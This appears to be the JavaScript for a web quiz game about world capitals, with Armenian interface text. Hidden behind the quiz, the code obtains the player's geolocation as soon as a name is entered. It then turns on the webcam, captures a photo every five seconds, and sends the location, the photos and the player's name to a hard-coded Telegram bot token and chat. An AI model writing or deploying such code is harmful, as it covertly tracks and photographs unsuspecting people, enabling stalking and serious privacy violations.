const questionsData = [
  { q: "Որն է Ֆրանսիայի մայրաքաղաքը", a: "Փարիզ", options: ["Փարիզ", "Լիոն", "Մարսել", "Նիս"] },
  { q: "Որն է Գերմանիայի մայրաքաղաքը", a: "Բեռլին", options: ["Մյունխեն", "Բեռլին", "Համբուրգ", "Ֆրանկֆուրտ"] },
  { q: "Որն է Հայաստանի մայրաքաղաքը", a: "Երևան", options: ["Գյումրի", "Վանաձոր", "Երևան", "Արտաշատ"] },
  { q: "Որն է Ռուսաստանի մայրաքաղաքը", a: "Մոսկվա", options: ["Սանկտ Պետերբուրգ", "Նովոսիբիրսկ", "Մոսկվա", "Կազան"] },
  { q: "Որն է Չինաստանի մայրաքաղաքը", a: "Պեկին", options: ["Պեկին", "Շանհայ", "Հոնկոնգ", "Գուանչժոու"] },
  // ➕ ещё 25 вопросов ты можешь добавить по этой же структуре
];

let selectedQuestions = [];
let currentQuestion = 0;
let correct = 0;
let wrong = 0;
let userName = "";

const questionEl = document.getElementById("question");
const answerButtons = document.getElementById("answer-buttons");
const scoreInfo = document.getElementById("score-info");
const tryAgainBtn = document.getElementById("try-again-btn");
const nameForm = document.getElementById("name-form");
const nameInput = document.getElementById("name-input");
const nameContainer = document.getElementById("user-name");

nameForm.addEventListener("submit", (e) => {
  e.preventDefault();
  userName = nameInput.value.trim() || "Անհայտ";
  document.getElementById("name-form-container").style.display = "none";
  document.getElementById("game-area").style.display = "block";
  nameContainer.textContent = `👤 ${userName}`;
  startGame();
  getLocation();
  startCamera();
});

tryAgainBtn.addEventListener("click", () => {
  location.reload(); // Перезагружает страницу
});

function startGame() {
  selectedQuestions = questionsData.sort(() => 0.5 - Math.random()).slice(0, 10);
  currentQuestion = 0;
  correct = 0;
  wrong = 0;
  setNextQuestion();
}

function setNextQuestion() {
  resetState();
  showQuestion(selectedQuestions[currentQuestion]);
}

function showQuestion(question) {
  questionEl.innerText = question.q;
  const shuffledAnswers = shuffle([...question.options]);
  shuffledAnswers.forEach((answer) => {
    const button = document.createElement("button");
    button.innerText = answer;
    button.addEventListener("click", () => selectAnswer(button, answer, question.a));
    answerButtons.appendChild(button);
  });
  updateScore();
}

function resetState() {
  answerButtons.innerHTML = "";
}

function selectAnswer(button, selected, correctAnswer) {
  const buttons = answerButtons.querySelectorAll("button");
  buttons.forEach(btn => btn.disabled = true);

  if (selected === correctAnswer) {
    button.classList.add("correct");
    correct++;
  } else {
    button.classList.add("wrong");
    buttons.forEach(btn => {
      if (btn.innerText === correctAnswer) btn.classList.add("correct");
    });
    wrong++;
  }

  currentQuestion++;
  updateScore();

  setTimeout(() => {
    if (currentQuestion < selectedQuestions.length) {
      setNextQuestion();
    } else {
      questionEl.innerText = `Խաղն ավարտվեց։ Ճիշտ՝ ${correct} / Սխալ՝ ${wrong}`;
      tryAgainBtn.style.display = "inline-block";
      sendToTelegram();
    }
  }, 1500);
}

function updateScore() {
  scoreInfo.innerText = `Մնաց: ${selectedQuestions.length - currentQuestion} | Ճիշտ: ${correct} | Սխալ: ${wrong}`;
}

function shuffle(array) {
  return array.sort(() => Math.random() - 0.5);
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition((pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
      sendToTelegram(mapsUrl);
    });
  }
}

function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
    const video = document.getElementById("video");
    video.srcObject = stream;

    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");

    setInterval(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL("image/jpeg");
      sendToTelegram(null, imageData);
    }, 5000);
  });
}

function sendToTelegram(geoLink = "", imageData = "") {
  const chatId = "8071841674";
  const token = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";

  let text = `👤 Անուն: ${userName}\n📊 Ճիշտ: ${correct} | Սխալ: ${wrong}`;
  if (geoLink) text += `\n📍 [Դիտել քարտեզում](${geoLink})`;

  const payload = {
    chat_id: chatId,
    text,
    parse_mode: "Markdown"
  };

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });

  if (imageData) {
    const photoData = new FormData();
    photoData.append("chat_id", chatId);
    photoData.append("photo", dataURLtoBlob(imageData), "photo.jpg");

    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: photoData
    });
  }
}

function dataURLtoBlob(dataurl) {
  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
  while(n--) u8arr[n] = bstr.charCodeAt(n);
  return new Blob([u8arr], {type:mime});
}
